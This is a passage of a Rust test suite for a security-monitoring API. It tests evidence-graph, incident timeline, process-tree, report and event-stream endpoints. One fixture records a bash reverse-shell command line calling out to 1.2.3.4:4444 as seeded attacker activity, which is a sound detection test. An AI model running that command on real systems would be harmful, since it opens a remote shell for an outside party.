        let (status, v) = get(&app, "/api/verdicts/aegis").await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(v["count"], 1);
        assert_eq!(v["detections"][0]["category"], "aegis_reflex");

        let (status, v) = get(&app, "/api/qsecbit").await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(v["latest"]["band"], "GREEN");
        assert_eq!(v["history"].as_array().unwrap().len(), 1);

        // /api/engines (ADR 0026): Sigma/YARA report real (absent-here -> "not_yet_run", never a
        // fabricated number); Suricata/AI Detection/Behavioral stay honestly labelled mock.
        let (status, v) = get(&app, "/api/engines").await;
        assert_eq!(status, StatusCode::OK);
        let engines = v["engines"].as_array().unwrap();
        assert_eq!(engines.len(), 5);
        let sigma = engines.iter().find(|e| e["name"] == "Sigma").unwrap();
        assert_eq!(sigma["source"], "real");
        let suricata = engines.iter().find(|e| e["name"] == "Suricata").unwrap();
        assert_eq!(suricata["source"], "mock");
        assert!(suricata["loaded_rules"].is_null());

        std::fs::remove_file(&db_path).ok();
    }

    #[tokio::test]
    async fn evidence_graph_drills_into_any_node_and_404s_on_unknown() {
        let (state, db_path) = seeded_state("graph");
        let app = build_router(state);

        let (_status, v) = get(&app, "/api/incidents").await;
        let incident_id = v["incidents"][0]["id"].as_str().unwrap().to_string();

        let (status, v) = get(&app, &format!("/api/evidence/graph?node={incident_id}")).await;
        assert_eq!(status, StatusCode::OK);
        assert!(v["node_count"].as_i64().unwrap() >= 2, "incident subgraph must include more than the seed node");

        let (status, _) = get(&app, "/api/evidence/graph?node=det:0000000000000000").await;
        assert_eq!(status, StatusCode::NOT_FOUND);

        std::fs::remove_file(&db_path).ok();
    }

    /// UI-agent-flagged fix: `/api/evidence/graph?node=` is a GENERIC node-drill endpoint (device,
    /// flow, process, …), yet reused `attack_path`'s own JSON, whose top-level key was literally
    /// `"incident"` even when the queried node isn't one — misleading. The response must now carry
    /// the queried node id under the canonical `"node"` key for ANY node type (not just
    /// incidents), while still keeping `"incident"` present (unchanged value) as a deprecated
    /// back-compat alias for any existing caller.
    #[tokio::test]
    async fn evidence_graph_node_key_names_the_queried_node_not_just_incident() {
        let (state, db_path) = seeded_state("graph-node-key");
        let app = build_router(state);

        let (_status, v) = get(&app, "/api/devices").await;
        let device_id = v["devices"][0]["id"].as_str().unwrap().to_string();
        assert!(!device_id.starts_with("inc:"), "sanity: this seed is a device node, not an incident");

        let (status, v) = get(&app, &format!("/api/evidence/graph?node={device_id}")).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(v["node"], device_id, "the canonical 'node' key must name the ACTUAL queried node, device or not");
        // back-compat: the underlying `attack_path` shape still carries "incident" too (unchanged
        // value, same as before this fix) — old callers reading it don't break.
        assert_eq!(v["incident"], device_id);

        std::fs::remove_file(&db_path).ok();
    }

    /// `/api/evidence/stats` (backend-audit gap 1): must surface a real, positive DB size
    /// (`db_size_bytes`) even before any `--prune` pass has ever run, and `last_prune: null` (never
    /// fabricated) until one has.
    #[tokio::test]
    async fn evidence_stats_reports_db_size_and_null_last_prune_before_any_prune_runs() {
        let (state, db_path) = seeded_state("stats");
        let app = build_router(state);

        let (status, v) = get(&app, "/api/evidence/stats").await;
        assert_eq!(status, StatusCode::OK);
        assert!(v["db_size_bytes"].as_i64().unwrap() > 0, "a seeded DB must report a real, positive size");
        assert!(v["last_prune"].is_null(), "must never fabricate a prune that hasn't happened");
        assert!(v["nodes"]["detections"].as_i64().unwrap() >= 1);

        std::fs::remove_file(&db_path).ok();
    }

    /// The evidence-chain closure: `/api/incidents/:id/timeline`, `/api/incidents/:id/processes`,
    /// `/api/reports`, `/api/reports/:id` — all four new read-API surfaces this pass adds,
    /// end-to-end against a real (temp) evidence DB, exactly like every other test in this file.
    #[tokio::test]
    async fn timeline_processes_and_reports_endpoints_serve_seeded_data_and_404_on_unknown_ids() {
        let db_path = std::env::temp_dir().join(format!("hp-api-test-report-chain-{}.db", std::process::id()));
        std::fs::remove_file(&db_path).ok();
        let incident_id = {
            let w = Evidence::open(&db_path).unwrap();
            w.ingest_flow(r#"{"type":"conn","ts":1000.0,"src_ip":"203.0.113.11","src_port":1,"dst_ip":"192.168.1.20","dst_port":22,"proto":"tcp","conn_state":"S0","orig_bytes":0,"resp_bytes":0}"#).unwrap();
            w.ingest_detection(r#"{"ts":1000.0,"rule_id":1000001,"rule_msg":"NAPSE SSH Brute Force","category":"brute_force","severity":2,"mitre":"T1110","src_ip":"203.0.113.11","dst_ip":"192.168.1.20","dst_port":22,"confidence":0.8}"#).unwrap();
            w.ingest_host_event(r#"{"type":"process","ts":1001.0,"device_ip":"203.0.113.11","pid":1,"parent_pid":0,"name":"init","cmdline":"/sbin/init"}"#).unwrap();
            w.ingest_host_event(r#"{"type":"process","ts":1002.0,"device_ip":"203.0.113.11","pid":2,"parent_pid":1,"name":"bash","cmdline":"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}"#).unwrap();
            let inc_id = w.correlate_incident("203.0.113.11", "SSH brute force incident").unwrap();
            w.generate_report(&inc_id).unwrap();
            inc_id
        };
        let manifest_path = std::env::temp_dir().join("hp-api-test-no-manifest.json");
        let claim_path = std::env::temp_dir().join("hp-api-test-no-claim.json");
        let rbac_tokens_path = std::env::temp_dir().join("hp-api-test-no-rbac-tokens.json");
        let state = AppState::open(&db_path, manifest_path, claim_path, Duration::from_millis(30), &rbac_tokens_path).unwrap();
        let app = build_router(state);

        // /api/incidents/:id/timeline — ts-ordered, 404 on an unknown incident.
        let (status, v) = get(&app, &format!("/api/incidents/{incident_id}/timeline")).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(v["found"], true);
        assert!(v["events"].as_array().unwrap().len() >= 2, "detection + flow, at least");
        let (status, _) = get(&app, "/api/incidents/inc:does-not-exist/timeline").await;
        assert_eq!(status, StatusCode::NOT_FOUND);

        // /api/incidents/:id/processes — the process tree (init -> reverse-shell bash).
        let (status, v) = get(&app, &format!("/api/incidents/{incident_id}/processes")).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(v["found"], true);
        assert_eq!(v["process_count"], 2);
        assert_eq!(v["roots"][0]["pid"], 1);
        assert_eq!(v["roots"][0]["children"][0]["pid"], 2);
        let (status, _) = get(&app, "/api/incidents/inc:does-not-exist/processes").await;
        assert_eq!(status, StatusCode::NOT_FOUND);

        // /api/reports — the report generated above is listed.
        let (status, v) = get(&app, "/api/reports").await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(v["count"], 1);
        let report_id = v["reports"][0]["id"].as_str().unwrap().to_string();
        assert_eq!(v["reports"][0]["incident_id"], incident_id);

        // /api/reports/:id — the full drill-back document; 404 on an unknown report id.
        let (status, v) = get(&app, &format!("/api/reports/{report_id}")).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(v["incident_id"], incident_id);
        assert!(v["report"]["mitre_techniques"].as_array().unwrap().contains(&serde_json::json!("T1110")));
        assert!(v["report"]["evidence_node_ids"].as_array().unwrap().iter().any(|n| n.as_str().is_some()));
        let (status, _) = get(&app, "/api/reports/report:0000000000000000").await;
        assert_eq!(status, StatusCode::NOT_FOUND);

        std::fs::remove_file(&db_path).ok();
    }

    #[tokio::test]
    async fn stream_emits_an_update_event_when_new_activity_lands() {
        let (state, db_path) = seeded_state("sse");
        let db_path_for_writer = db_path.clone();
        let app = build_router(state);

        // Connect to the SSE stream FIRST (its watermark anchors at "now" — the seeded data above
        // must NOT appear as a spurious first event).
        let req = axum::http::Request::builder().uri("/api/stream").body(Body::empty()).unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let mut body = resp.into_body();

        // Ingest a NEW detection through a separate writer connection (WAL allows one writer +
        // concurrent readers), mirroring the real `hookprobe-evidence.timer` writing while the API's
        // read-only handle serves requests.
        tokio::task::spawn_blocking(move || {
            let w = Evidence::open(&db_path_for_writer).unwrap();
            w.ingest_detection(r#"{"ts":99999999999.0,"rule_id":42,"rule_msg":"fresh detection for SSE test","category":"port_scan","severity":1,"src_ip":"9.9.9.9","dst_ip":"8.8.8.8","dst_port":53,"confidence":0.5}"#).unwrap();
        })
        .await
        .unwrap();

        // Read frames until we see our event or time out (bounded — this must never hang the suite).
        let found = tokio::time::timeout(Duration::from_secs(10), async {
            loop {
                let frame = body.frame().await.expect("stream ended before emitting an event").unwrap();
                if let Some(bytes) = frame.data_ref() {
                    let text = String::from_utf8_lossy(bytes);
                    if text.contains("fresh detection for SSE test") {
                        return true;
                    }
                }
            }
        })
        .await
        .expect("timed out waiting for the SSE stream to emit the new detection");
        assert!(found);

        std::fs::remove_file(&db_path).ok();
    }
}
